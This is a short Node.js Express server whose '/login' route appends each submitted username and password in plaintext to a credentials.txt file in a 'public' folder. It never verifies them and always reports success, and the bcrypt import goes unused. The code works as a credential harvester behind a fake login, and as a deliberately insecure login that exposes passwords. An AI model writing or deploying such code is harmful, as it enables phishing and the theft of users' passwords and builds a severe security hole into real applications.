const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const bcrypt = require('bcrypt');

// Middleware to parse incoming request bodies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Your code for the '/login' route goes here
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Read the existing data from the credentials.txt file
  const filePath = path.join(__dirname, 'public', 'credentials.txt');

  // Append the new credentials to the file
  const dataToAppend = `${username}:${password}\n`;
  fs.appendFile(filePath, dataToAppend, 'utf8', (err) => {
    if (err) {
      console.error('Error writing to credentials file:', err);
      return res.sendStatus(500);
    }
    console.log('Credentials stored successfully.');
    // Respond with success status (no need to check credentials)
    res.sendStatus(200);
  });
});

// Start the server
const port = 3000; // You can use any available port number
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
